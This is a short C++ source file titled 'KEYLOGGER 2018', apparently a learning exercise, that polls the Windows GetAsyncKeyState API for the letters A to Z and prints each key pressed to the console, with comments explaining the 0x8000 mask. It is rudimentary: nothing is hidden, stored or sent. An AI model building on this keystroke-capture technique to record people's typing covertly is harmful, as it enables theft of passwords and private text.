//  KEYLOGGER 2018
//  logan Campbell
#include <windows.h>
#include <iostream>
using namespace std;

void capture()
{
  bool repeat;
  repeat = true;
  char character;

  while (repeat)
  {
      for (char letter = 'A'; letter <= 'Z'; letter++)
      {
          if( GetAsyncKeyState(letter) & 0x8000 )
          {
              character = letter;
              repeat = false;
          }

      }
  }
  cout << "typed: " << character << endl;
  Sleep(90.5);
}

int main ()
{
    cout << "KEYLOGGER TEST 1 " << endl;
    // GetAsyncKeyState apart of the windows api. it identifies keystrokes as hexadecimals
    // GetAsyncKeyState uses a 16-bit return, the mask for the left bit is 1000000000000000, or, more concisely, 0x8000.
    // when a key is pressed it's presented like:  if (GetAsyncKeyState(vkCode) & 0x8000)
    // virutal key code : vkCode
    bool repeat = true;
    while (repeat == true)
    {
        capture();
    }

return 1;
}
